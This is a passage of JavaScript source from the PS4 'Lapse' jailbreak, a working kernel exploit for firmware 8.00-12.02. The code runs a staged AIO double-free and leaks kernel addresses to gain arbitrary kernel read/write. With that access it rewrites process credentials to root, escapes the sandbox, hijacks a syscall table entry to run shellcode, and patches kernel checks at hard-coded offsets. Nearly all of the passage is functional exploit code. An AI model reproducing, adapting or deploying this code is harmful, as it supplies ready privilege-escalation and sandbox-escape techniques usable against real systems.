        const sy_call = kernel.read_qword(sysent_661_addr.add(8));
        const sy_thrcnt = kernel.read_dword(sysent_661_addr.add(0x2C));

        log("Original sy_narg: " + hex(sy_narg));
        log("Original sy_call: " + hex(sy_call));
        log("Original sy_thrcnt: " + hex(sy_thrcnt));

        // Calculate jmp rsi gadget address
        const jmp_rsi_gadget = kernel.addr.base.add(kernel_offset.JMP_RSI_GADGET);
        log("jmp rsi gadget @ " + hex(jmp_rsi_gadget));

        // Allocate buffer for shellcode in userspace first
        const shellcode_buf = malloc(shellcode.length + 0x100);
        log("Shellcode buffer @ " + hex(shellcode_buf));

        // Copy shellcode to userspace buffer
        for (var i = 0; i < shellcode.length; i++) {
            write8(shellcode_buf.add(i), shellcode[i]);
        }

        // Verify first bytes
        const first_bytes = read32(shellcode_buf);
        log("First bytes @ shellcode: " + hex(first_bytes));

        // Hijack sysent[661] to point to jmp rsi gadget
        log("Hijacking sysent[661]...");
        kernel.write_dword(sysent_661_addr, 2);                      // sy_narg = 2
        kernel.write_qword(sysent_661_addr.add(8), jmp_rsi_gadget);  // sy_call = jmp rsi
        kernel.write_dword(sysent_661_addr.add(0x2C), 1);            // sy_thrcnt = 1
        log("Hijacked sysent[661]");

        // Check if jitshm_create has a dedicated gadget
        const jitshm_num = 0x215; // SYSCALL.jitshm_create = 0x215n;     // 533
        const jitshm_gadget = syscalls.map.get(jitshm_num);
        log("jitshm_create gadget: " + (jitshm_gadget ? hex(jitshm_gadget) : "NOT FOUND"));

        // Try using the standard syscall() function if gadget exists
        if (!jitshm_gadget) {
            log("ERROR: jitshm_create gadget not found in libkernel");
            log("Kernel patches require jitshm_create syscall support");
            return false;
        }

        // 1. jitshm_create(0, aligned_memsz, PROT_RWX)
        log("Calling jitshm_create...");

        const exec_handle = jitshm_create(0, aligned_memsz, PROT_RWX);
        log("jitshm_create handle: " + hex(exec_handle));

        if (Number(exec_handle.shr(32)) >= 0xffff8000) {
            log("ERROR: jitshm_create failed");
            kernel.write_dword(sysent_661_addr, sy_narg);
            kernel.write_qword(sysent_661_addr.add(8), sy_call);
            kernel.write_dword(sysent_661_addr.add(0x2C), sy_thrcnt);
            return false;
        }

        // 2. mmap(mapping_addr, aligned_memsz, PROT_RWX, MAP_SHARED|MAP_FIXED, exec_handle, 0)
        log("Calling mmap...");

        const mmap_result = mmap(mapping_addr, aligned_memsz, PROT_RWX, 0x11, exec_handle, 0);
        log("mmap result: " + hex(mmap_result));

        if (Number(mmap_result.shr(32)) >= 0xffff8000) {
            log("ERROR: mmap failed");
            kernel.write_dword(sysent_661_addr, sy_narg);
            kernel.write_qword(sysent_661_addr.add(8), sy_call);
            kernel.write_dword(sysent_661_addr.add(0x2C), sy_thrcnt);
            return false;
        }

        // 3. Copy shellcode to mapped memory
        log("Copying shellcode to " + hex(mapping_addr) + "...");
        for (var j = 0; j < shellcode.length; j++) {
            write8(mapping_addr.add(j), shellcode[j]);
        }

        // Verify
        const verify_bytes = read32(mapping_addr);
        log("First bytes @ mapped: " + hex(verify_bytes));

        // 4. kexec(mapping_addr) - syscall 661, hijacked to jmp rsi
        log("Calling kexec...");

        const kexec_result = kexec(mapping_addr);
        log("kexec returned: " + hex(kexec_result));

        // === Verify 12.00 kernel patches ===
        if (fw_version === "12.00" || fw_version === "12.02") {
            log("Verifying 12.00 kernel patches...");
            var patch_errors = 0;

            // Patch offsets and expected values for 12.00
            const patches_to_verify = [
                { off: 0x1b76a3, exp: 0x04eb, name: "dlsym_check1", size: 2 },
                { off: 0x1b76b3, exp: 0x04eb, name: "dlsym_check2", size: 2 },
                { off: 0x1b76d3, exp: 0xe990, name: "dlsym_check3", size: 2 },
                { off: 0x627af4, exp: 0x00eb, name: "veriPatch", size: 2 },
                { off: 0xacd, exp: 0xeb, name: "bcopy", size: 1 },
                { off: 0x2bd3cd, exp: 0xeb, name: "bzero", size: 1 },
                { off: 0x2bd411, exp: 0xeb, name: "pagezero", size: 1 },
                { off: 0x2bd48d, exp: 0xeb, name: "memcpy", size: 1 },
                { off: 0x2bd4d1, exp: 0xeb, name: "pagecopy", size: 1 },
                { off: 0x2bd67d, exp: 0xeb, name: "copyin", size: 1 },
                { off: 0x2bdb2d, exp: 0xeb, name: "copyinstr", size: 1 },
                { off: 0x2bdbfd, exp: 0xeb, name: "copystr", size: 1 },
                { off: 0x6283df, exp: 0x00eb, name: "sysVeri_suspend", size: 2 },
                { off: 0x490, exp: 0x00, name: "syscall_check", size: 4 },
                { off: 0x4c2, exp: 0xeb, name: "syscall_jmp1", size: 1 },
                { off: 0x4b9, exp: 0x00eb, name: "syscall_jmp2", size: 2 },
                { off: 0x4b5, exp: 0x00eb, name: "syscall_jmp3", size: 2 },
                { off: 0x3914e6, exp: 0xeb, name: "setuid", size: 1 },
                { off: 0x2fc0ec, exp: 0x04eb, name: "vm_map_protect", size: 2 },
                { off: 0x1b7164, exp: 0xe990, name: "dynlib_load_prx", size: 2 },
                { off: 0x1fa71a, exp: 0x37, name: "mmap_rwx1", size: 1 },
                { off: 0x1fa71d, exp: 0x37, name: "mmap_rwx2", size: 1 },
                { off: 0x1102d80, exp: 0x02, name: "sysent11_narg", size: 4 },
                { off: 0x1102dac, exp: 0x01, name: "sysent11_thrcnt", size: 4 },
            ];

            for (p of patches_to_verify) {
                var actual;
                if (p.size === 1) {
                    actual = Number(kernel.read_byte(kernel.addr.base.add(p.off)));
                } else if (p.size === 2) {
                    actual = Number(kernel.read_word(kernel.addr.base.add(p.off)));
                } else {
                    actual = Number(kernel.read_dword(kernel.addr.base.add(p.off)));
                }

                if (actual === p.exp) {
                    log("  [OK] " + p.name);
                } else {
                    log("  [FAIL] " + p.name + ": expected " + hex(p.exp) + ", got " + hex(actual));
                    patch_errors++;
                }
            }

            // Special check for sysent[11] sy_call - should point to jmp [rsi] gadget
            const sysent11_call = kernel.read_qword(kernel.addr.base.add(0x1102d88));
            const expected_gadget = kernel.addr.base.add(0x47b31);
            if (sysent11_call.eq(expected_gadget)) {
                log("  [OK] sysent11_call -> jmp_rsi @ " + hex(sysent11_call));
            } else {
                log("  [FAIL] sysent11_call: expected " + hex(expected_gadget) + ", got " + hex(sysent11_call));
                patch_errors++;
            }

            if (patch_errors === 0) {
                log("All 12.00 kernel patches verified OK!");
            } else {
                log("[WARNING] " + patch_errors + " kernel patches failed!");
            }
        }

        // Restore original sysent[661]
        log("Restoring sysent[661]...");
        kernel.write_dword(sysent_661_addr, sy_narg);
        kernel.write_qword(sysent_661_addr.add(8), sy_call);
        kernel.write_dword(sysent_661_addr.add(0x2C), sy_thrcnt);
        log("Restored sysent[661]");

        log("Kernel patches applied!");

        return true;

    } catch (e) {
        log("apply_kernel_patches error: " + e.message);
        log(e.stack);
        return false;
    }
}

// End

function lapse() {

    try {
        log("=== PS4 Lapse Jailbreak ===");

        FW_VERSION = get_fwversion();
        log("Detected PS4 firmware: " + FW_VERSION);

        function compare_version(a, b) {
            const a_arr = a.split('.');
            const amaj = a_arr[0];
            const amin = a_arr[1];
            const b_arr = b.split('.');
            const bmaj = b_arr[0];
            const bmin = b_arr[1];
            return amaj === bmaj ? amin - bmin : amaj - bmaj;
        }

        if (compare_version(FW_VERSION, "8.00") < 0 || compare_version(FW_VERSION, "12.02") > 0) {
            log("Unsupported PS4 firmware\nSupported: 8.00-12.02\nAborting...");
            send_notification("Unsupported PS4 firmware\nAborting...");
            return false;
        }

        kernel_offset = get_kernel_offset(FW_VERSION);
        log("Kernel offsets loaded for FW " + FW_VERSION);

        // === STAGE 0: Setup ===
        log("=== STAGE 0: Setup ===");

        const setup_success = setup();
        if (!setup_success) {
            log("Setup failed");
            send_notification("Lapse: Setup failed");
            return false;
        }
        log("Setup completed");

        log("");
        log("=== STAGE 1: Double-free AIO ===");

        const sd_pair = double_free_reqs2();

        if (sd_pair === null) {
            log("[FAILED] Stage 1");
            send_notification("Lapse: FAILED at Stage 1");
            return false;
        }
        log("Stage 1 completed");

        log("");
        log("=== STAGE 2: Leak kernel addresses ===");
        leak_result = leak_kernel_addrs(sd_pair, sds);
        if (leak_result === null) {
            log("Stage 2 kernel address leak failed");
            cleanup_fail();
            return false;
        }
        log("Stage 2 completed");
        log("Leaked addresses:");
        log("  reqs1_addr: " + hex(leak_result.reqs1_addr));
        log("  kbuf_addr: " + hex(leak_result.kbuf_addr));
        log("  kernel_addr: " + hex(leak_result.kernel_addr));
        log("  target_id: " + hex(leak_result.target_id));
        log("  fake_reqs3_addr: " + hex(leak_result.fake_reqs3_addr));
        log("  aio_info_addr: " + hex(leak_result.aio_info_addr));
        log("  evf: " + hex(leak_result.evf));

        log("");
        log("=== STAGE 3: Double free SceKernelAioRWRequest ===");
        const pktopts_sds = double_free_reqs1(
            leak_result.reqs1_addr,
            leak_result.target_id,
            leak_result.evf,
            sd_pair[0],
            sds,
            sds_alt,
            leak_result.fake_reqs3_addr
        );
        
        close(leak_result.fake_reqs3_sd);

        if (pktopts_sds === null) {
            log("Stage 3 double free SceKernelAioRWRequest failed");
            cleanup_fail();
            return false;
        }
        
        log("Stage 3 completed!");
        log("Aliased socket pair: " + hex(pktopts_sds[0]) + ", " + hex(pktopts_sds[1]));
        
        log("");
        log("=== STAGE 4: Get arbitrary kernel read/write ===");

        arw_result = make_kernel_arw(
            pktopts_sds,
            leak_result.reqs1_addr,
            leak_result.kernel_addr,
            sds,
            sds_alt,
            leak_result.aio_info_addr
        );
        
        if (arw_result === null) {
            log("Stage 4 get arbitrary kernel read/write failed");
            cleanup_fail();
            return false;
        }
        
        log("Stage 4 completed!");

        log("");
        log("=== STAGE 5: Jailbreak ===");

        const OFFSET_P_UCRED = 0x40;
        const proc = kernel.addr.curproc;

        // Calculate kernel base
        kernel.addr.base = kernel.addr.inside_kdata.sub(kernel_offset.EVF_OFFSET);
        log("Kernel base: " + hex(kernel.addr.base));

        const uid_before = Number(getuid());
        const sandbox_before = Number(is_in_sandbox());
        log("BEFORE: uid=" + uid_before + ", sandbox=" + sandbox_before);

        // Patch ucred
        const proc_fd = kernel.read_qword(proc.add(kernel_offset.PROC_FD));
        const ucred = kernel.read_qword(proc.add(OFFSET_P_UCRED));

        kernel.write_dword(ucred.add(0x04), 0);  // cr_uid
        kernel.write_dword(ucred.add(0x08), 0);  // cr_ruid
        kernel.write_dword(ucred.add(0x0C), 0);  // cr_svuid
        kernel.write_dword(ucred.add(0x10), 1);  // cr_ngroups
        kernel.write_dword(ucred.add(0x14), 0);  // cr_rgid

        const prison0 = kernel.read_qword(kernel.addr.base.add(kernel_offset.PRISON0));
        kernel.write_qword(ucred.add(0x30), prison0);

        kernel.write_qword(ucred.add(0x60), new BigInt(0xFFFFFFFF, 0xFFFFFFFF));  // sceCaps
        kernel.write_qword(ucred.add(0x68), new BigInt(0xFFFFFFFF, 0xFFFFFFFF));

        const rootvnode = kernel.read_qword(kernel.addr.base.add(kernel_offset.ROOTVNODE));
        kernel.write_qword(proc_fd.add(0x10), rootvnode);  // fd_rdir
        kernel.write_qword(proc_fd.add(0x18), rootvnode);  // fd_jdir

        const uid_after = Number(getuid());
        const sandbox_after = Number(is_in_sandbox());
        log("AFTER:  uid=" + uid_after + ", sandbox=" + sandbox_after);

        if (uid_after === 0 && sandbox_after === 0) {
            log("Sandbox escape complete!");
        } else {
            log("[WARNING] Sandbox escape may have failed");
        }

        // === Apply kernel patches via kexec ===
        // Uses syscall_raw() which sets rax manually for syscalls without gadgets
        log("Applying kernel patches...");
        const kpatch_result = apply_kernel_patches(FW_VERSION);
        if (kpatch_result) {
            log("Kernel patches applied successfully!");

            // Comprehensive kernel patch verification
            log("Verifying kernel patches...");
            var all_patches_ok = true;

            // 1. Verify mmap RWX patch (0x33 -> 0x37 at two locations)
            const mmap_offsets = get_mmap_patch_offsets(FW_VERSION);
            if (mmap_offsets) {
                const b1 = ipv6_kernel_rw.ipv6_kread8(kernel.addr.base.add(mmap_offsets[0]));
                const b2 = ipv6_kernel_rw.ipv6_kread8(kernel.addr.base.add(mmap_offsets[1]));
                const byte1 = Number(b1.and(0xff));
                const byte2 = Number(b2.and(0xff));
                if (byte1 === 0x37 && byte2 === 0x37) {
                    log("  [OK] mmap RWX patch");
                } else {
                    log("  [FAIL] mmap RWX: [" + hex(mmap_offsets[0]) + "]=" + hex(byte1) + " [" + hex(mmap_offsets[1]) + "]=" + hex(byte2));
                    all_patches_ok = false;
                }
            } else {
                log("  [SKIP] mmap RWX (no offsets for FW " + FW_VERSION + ")");
            }

            // 2. Test mmap RWX actually works by trying to allocate RWX memory
            try {
                const PROT_RWX = 0x7;  // READ | WRITE | EXEC
                const MAP_ANON = 0x1000;
                const MAP_PRIVATE = 0x2;
                const test_addr = mmap(0, 0x1000, PROT_RWX, MAP_PRIVATE | MAP_ANON, new BigInt(0xFFFFFFFF, 0xFFFFFFFF), 0);
                if (Number(test_addr.shr(32)) < 0xffff8000) {
                    log("  [OK] mmap RWX functional @ " + hex(test_addr));
                    // Unmap the test allocation
                    munmap(test_addr, 0x1000);
                } else {
                    log("  [FAIL] mmap RWX functional: " + hex(test_addr));
                    all_patches_ok = false;
                }
            } catch (e) {
                log("  [FAIL] mmap RWX test error: " + e.message);
                all_patches_ok = false;
            }

            if (all_patches_ok) {
                log("All kernel patches verified OK!");
            } else {
                log("[WARNING] Some kernel patches may have failed");
            }
        } else {
            log("[WARNING] Kernel patches failed - continuing without patches");
        }

        log("Stage 5 completed - JAILBROKEN");
        //utils.notify("The Vue-after-Free team congratulates you\nLapse Finished OK\nEnjoy freedom");
        
        cleanup();

        return true;
    }
    catch (e) {
        log("Lapse error: " + e.message);
        alert("Lapse error: " + e.message);
        utils.notify("Reboot and try again!")
        log(e.stack);
        return false;
    }
}

function cleanup() {
    log("Performing cleanup...");

    try {
        if (block_fd !== 0xffffffff) {
            close(block_fd);
            block_fd = 0xffffffff;
        }

        if (unblock_fd !== 0xffffffff) {
            close(unblock_fd);
            unblock_fd = 0xffffffff;
        }

        if (typeof groom_ids !== 'undefined')
            if (groom_ids !== null) {
                const groom_ids_addr = malloc(4 * NUM_GROOMS);
                for (var i = 0; i < NUM_GROOMS; i++) {
                    write32(groom_ids_addr.add(i * 4), groom_ids[i]);
                }
                free_aios2(groom_ids_addr, NUM_GROOMS);
                groom_ids = null;
            }

        if (block_id !== 0xffffffff) {
            const block_id_buf = malloc(4);
            write32(block_id_buf, block_id);
            const block_errors = malloc(4);
            aio_multi_wait_fun(block_id_buf, 1, block_errors, 1, 0);
            aio_multi_delete_fun(block_id_buf, 1, block_errors);
            block_id = 0xffffffff;
        }

        if (sds !== null) {
            for (var i = 0; i < sds.length; i++) {
                close(sds[i]);
            }
            sds = null;
        }

        if (sds_alt !== null) {
            for (var i = 0; i < sds_alt.length; i++) {
                close(sds_alt[i]);
            }
            sds_alt = null;
        }

        if (typeof sd_pair !== 'undefined') {
            if (sd_pair !== null) {
                close(sd_pair[0]);
                close(sd_pair[1]);
            }
            sd_pair = null;
        }
        
        if (prev_core >= 0) {
            log("Restoring to previous core: " + prev_core);
            pin_to_core(prev_core);
            prev_core = -1;
        }
        
        set_rtprio(prev_rtprio);

        log("Cleanup completed");

    } catch (e) {
        log("Error during cleanup: " + e.message);
    }
}

function cleanup_fail() {
    utils.notify("Lapse Failed! reboot and try again! UwU")
    jsmaf.root.children.push(bg_fail);
    cleanup();
}
